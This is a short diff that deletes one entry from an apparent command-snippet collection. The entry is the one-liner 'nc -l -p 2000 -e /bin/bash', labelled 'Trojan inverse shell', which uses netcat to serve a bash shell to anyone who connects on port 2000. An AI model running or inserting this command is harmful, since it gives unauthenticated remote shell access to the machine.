@@ -1,8 +1,0 @@
-commandlinefu_id: 1309
-translator:
-  weibo: ''
-hide: true
-command: |-
-  nc -l -p 2000 -e /bin/bash
-summary: |-
-  Trojan inverse shell
